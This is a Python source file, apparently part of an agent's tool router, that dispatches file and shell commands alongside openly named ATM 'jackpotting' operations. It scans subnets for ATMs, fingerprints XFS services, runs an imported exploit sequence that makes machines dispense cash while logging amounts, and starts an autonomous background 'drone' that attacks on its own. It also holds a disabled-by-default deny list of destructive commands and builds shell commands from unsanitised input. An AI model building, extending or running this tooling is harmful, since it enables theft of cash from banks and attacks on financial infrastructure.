#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
executor.py - Tool execution router with XFS network support
"""

import tools
import subprocess
import os
import json
import time
from datetime import datetime
from typing import Tuple, Optional, Dict, Any

class ExecutionContext:
    """Manages execution context and logging"""
    
    def __init__(self):
        self.execution_history = []
        self.last_result = None
        self.secure_mode = False
        self.targets = []
    
    def log_execution(self, tool: str, args: str, result: str, error: str = None) -> Dict:
        entry = {
            'timestamp': datetime.now().isoformat(),
            'tool': tool,
            'args': args,
            'result': str(result)[:1000],
            'error': str(error) if error else None
        }
        self.execution_history.append(entry)
        self.last_result = result
        return entry

_context = ExecutionContext()

# ============================================================================
# MAIN EXECUTE FUNCTION
# ============================================================================

def execute(tool: str, args: str, secure: bool = True) -> str:
    """
    Parse and execute tool calls
    
    Args:
        tool: Tool name (ls, read, write, shell, xfs_remote, etc.)
        args: Tool arguments
        secure: Enable security checks
    
    Returns:
        str: Command output or error message
    """
    tool = tool.strip().lower()
    args = args.strip() if args else ""
    
    # ============================================================
    # Security check
    # ============================================================
    if secure and _context.secure_mode:
        dangerous_patterns = ['rm -rf', 'mkfs', 'dd if=', ':(){ :|:& };:', 'shred']
        if any(pattern in args for pattern in dangerous_patterns):
            return "⚠️ Security block: Command contains dangerous pattern"
    
    try:
        # Log execution start
        _context.log_execution(tool, args, "IN_PROGRESS")
        start_time = time.time()
        
        # ============================================================
        # Dispatch to appropriate handler
        # ============================================================
        if tool == "ls":
            result = tools.list_files(args if args else ".")
            
        elif tool == "read":
            if not args:
                return "Error: read requires file path"
            result = tools.read_file(args)
            
        elif tool == "write":
            if "|" not in args:
                return "Error: write expects 'path|content' format"
            path, content = args.split("|", 1)
            result = tools.write_file(path.strip(), content)
            
        elif tool == "edit":
            parts = args.split("|", 2)
            if len(parts) < 3:
                return "Error: edit expects 'path|old_text|new_text' format"
            path, old, new = parts
            result = tools.edit_file(path.strip(), old, new)
            
        elif tool == "exec":
            if not args:
                return "Error: exec requires code"
            result = tools.exec_code(args)
            
        elif tool == "shell":
            if not args:
                return "Error: shell requires command"
            # Special handling for XFS commands
            if "xfsc" in args.lower() or "cdm" in args.lower():
                result = _execute_xfs_command(args)
            else:
                result = tools.shell(args)
            
        elif tool in ["xfs", "xfs_remote"]:
            # Format: xfs_remote <target_ip> <port> <command>
            parts = args.split()
            if len(parts) < 3:
                return "Error: xfs_remote requires <target_ip> <port> <command>"
            target_ip = parts[0]
            port = int(parts[1])
            command = " ".join(parts[2:])
            result = _execute_remote_xfs(target_ip, port, command)
            
        elif tool in ["jackpot", "xfs_jackpot", "exploit_atm"]:
            # Format: exploit_atm <target_ip> <port> [amount]
            parts = args.split()
            if len(parts) < 1:
                return "Error: exploit_atm requires <target_ip> [port]"
            target_ip = parts[0]
            port = int(parts[1]) if len(parts) > 1 else 7777
            amount = int(parts[2]) if len(parts) > 2 else 100
            
            result = _execute_jackpot(target_ip, port, amount)
            
        elif tool in ["scan", "scan_network"]:
            # Format: scan_network [subnet]
            subnet = args if args else "192.168.1.0/24"
            result = _execute_scan(subnet)
            
        elif tool in ["drone", "start_drone"]:
            # Format: start_drone [subnet] [interval]
            parts = args.split()
            subnet = parts[0] if parts else "192.168.1.0/24"
            interval = int(parts[1]) if len(parts) > 1 else 60
            result = _execute_start_drone(subnet, interval)
            
        elif tool == "xfs_status":
            target_ip = args.strip() or "127.0.0.1"
            result = _execute_remote_xfs(target_ip, 7777, "cdm status")
            
        elif tool == "fingerprint":
            target_ip = args.strip()
            if not target_ip:
                return "Error: fingerprint requires target IP"
            result = _execute_fingerprint(target_ip)
            
        elif tool in ["discover", "discover_atms"]:
            subnet = args if args else "192.168.1.0/24"
            result = _execute_discover(subnet)
            
        elif tool == "enum_xfs":
            target_ip = args.strip()
            if not target_ip:
                return "Error: enum_xfs requires target IP"
            result = _execute_enum(target_ip)
            
        else:
            result = f"Error: Unknown tool '{tool}'. Available: ls, read, write, edit, exec, shell, xfs, jackpot, scan, drone, status, fingerprint, discover, enum_xfs"
        
        # Log result
        exec_time = int((time.time() - start_time) * 1000)
        _context.log_execution(tool, args, result)
        
        return result
        
    except Exception as e:
        error_msg = f"Error executing '{tool}': {str(e)}"
        _context.log_execution(tool, args, "ERROR", e)
        return error_msg

# ============================================================================
# XFS NETWORK HANDLERS
# ============================================================================

def _execute_remote_xfs(target_ip: str, port: int, command: str) -> str:
    """Execute XFS command remotely using network_xfs module"""
    try:
        from network_xfs import RemoteXFSExploit
        exploit = RemoteXFSExploit()
        result = exploit.execute_remote_command(target_ip, port, command)
        return result
    except ImportError:
        # Fallback: use xfsc with network parameters
        return _execute_xfs_with_net(target_ip, port, command)
    except Exception as e:
        return f"XFS remote error: {str(e)}"

def _execute_xfs_with_net(target_ip: str, port: int, command: str) -> str:
    """Fallback: use xfsc with network parameters"""
    xfsc_path = _get_xfsc_path()
    if not xfsc_path:
        return "Error: xfsc not found and network_xfs module not available"
    
    try:
        cmd = f"{xfsc_path} -c '{command}' --host {target_ip} --port {port}"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
        return result.stdout if result.stdout else result.stderr
    except Exception as e:
        return f"Error: {str(e)}"

def _get_xfsc_path() -> Optional[str]:
    """Find xfsc executable"""
    import shutil
    import os
    
    # Check in current directory
    if os.path.exists('xfsc'):
        return './xfsc'
    if os.path.exists('xfsc.exe'):
        return './xfsc.exe'
    
    # Check in xfsc directory
    xfsc_dir = os.path.join(os.path.dirname(__file__), '..', 'xfsc')
    if os.path.exists(os.path.join(xfsc_dir, 'xfsc')):
        return os.path.join(xfsc_dir, 'xfsc')
    if os.path.exists(os.path.join(xfsc_dir, 'xfsc.exe')):
        return os.path.join(xfsc_dir, 'xfsc.exe')
    
    # Check in PATH
    path_xfsc = shutil.which('xfsc')
    if path_xfsc:
        return path_xfsc
    
    # Fallback: try common locations
    common_paths = ['/usr/local/bin/xfsc', '/usr/bin/xfsc', './bin/xfsc']
    for p in common_paths:
        if os.path.exists(p):
            return p
    
    return None

def _execute_jackpot(target_ip: str, port: int, amount: int = 100) -> str:
    """Execute full jackpot sequence"""
    try:
        from network_xfs import RemoteXFSExploit
        exploit = RemoteXFSExploit()
        result = exploit.exploit_sequence(target_ip, port)
        
        # Log to database
        try:
            from sqlite_db import BrainDB
            from config import DB_PATH
            db = BrainDB(DB_PATH)
            db.log_jackpot_attempt(
                attempt_type="manual",
                target_ip=target_ip,
                target_port=port,
                commands=[step['command'] for step in result['steps']],
                results=[step['result'] for step in result['steps']],
                success=result['success'],
                amount_dispensed=result.get('amount_dispensed', 0)
            )
        except:
            pass
        
        return json.dumps(result, indent=2)
    except Exception as e:
        return f"Jackpot execution failed: {str(e)}"

def _execute_scan(subnet: str) -> str:
    """Execute network scan for XFS devices"""
    try:
        from network_xfs import RemoteXFSExploit
        exploit = RemoteXFSExploit()
        results = exploit.scan_subnet(subnet)
        
        # Log to database
        try:
            from sqlite_db import BrainDB
            from config import DB_PATH
            db = BrainDB(DB_PATH)
            db.log_device_scan(json.dumps(results))
        except:
            pass
        
        return json.dumps(results, indent=2)
    except Exception as e:
        return f"Scan failed: {str(e)}"

def _execute_start_drone(subnet: str, interval: int) -> str:
    """Start autonomous drone"""
    try:
        from network_xfs import NetworkJackpotDrone
        drone = NetworkJackpotDrone()
        
        # Start in background thread
        import threading
        thread = threading.Thread(target=drone.start_autonomous_scan, args=(subnet, interval))
        thread.daemon = True
        thread.start()
        
        return f"Drone started on {subnet} with {interval}s interval"
    except Exception as e:
        return f"Drone start failed: {str(e)}"

def _execute_fingerprint(target_ip: str) -> str:
    """Fingerprint a target for XFS services"""
    try:
        from network_xfs import RemoteXFSExploit
        exploit = RemoteXFSExploit()
        
        results = {}
        for port in exploit.xfs_ports:
            if exploit._check_port(target_ip, port):
                results[port] = "open"
                if exploit._is_xfs_service(target_ip, port):
                    results[port] = "XFS"
            else:
                results[port] = "closed"
        
        return json.dumps(results, indent=2)
    except Exception as e:
        return f"Fingerprint failed: {str(e)}"

def _execute_discover(subnet: str) -> str:
    """Discover ATMs on network"""
    try:
        from network_xfs import RemoteXFSExploit
        exploit = RemoteXFSExploit()
        atms = exploit.discover_atms(subnet)
        return json.dumps(atms, indent=2)
    except Exception as e:
        return f"Discovery failed: {str(e)}"

def _execute_enum(target_ip: str) -> str:
    """Enumerate XFS services on target"""
    try:
        from network_xfs import RemoteXFSExploit
        exploit = RemoteXFSExploit()
        
        results = []
        for port in exploit.xfs_ports:
            if exploit._check_port(target_ip, port):
                services = ["XFS" if exploit._is_xfs_service(target_ip, port) else "unknown"]
                results.append({"port": port, "services": services})
        
        return json.dumps(results, indent=2)
    except Exception as e:
        return f"Enumeration failed: {str(e)}"

def _execute_xfs_command(cmd: str) -> str:
    """Execute XFS command with retry and error handling"""
    from tools import shell
    
    max_retries = 3
    for attempt in range(max_retries):
        try:
            result = shell(cmd)
            if "error" not in result.lower():
                return result
            time.sleep(1)
        except Exception as e:
            if attempt == max_retries - 1:
                return f"XFS command failed after {max_retries} attempts: {str(e)}"
            time.sleep(2)
    
    return "XFS command failed"

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def get_execution_history(limit: int = 10) -> list:
    """Get recent execution history"""
    return _context.execution_history[-limit:]

def set_secure_mode(enabled: bool = True) -> str:
    """Enable/disable security restrictions"""
    _context.secure_mode = enabled
    return f"Secure mode: {'ENABLED' if enabled else 'DISABLED'}"

def clear_history() -> None:
    """Clear execution history"""
    _context.execution_history = []
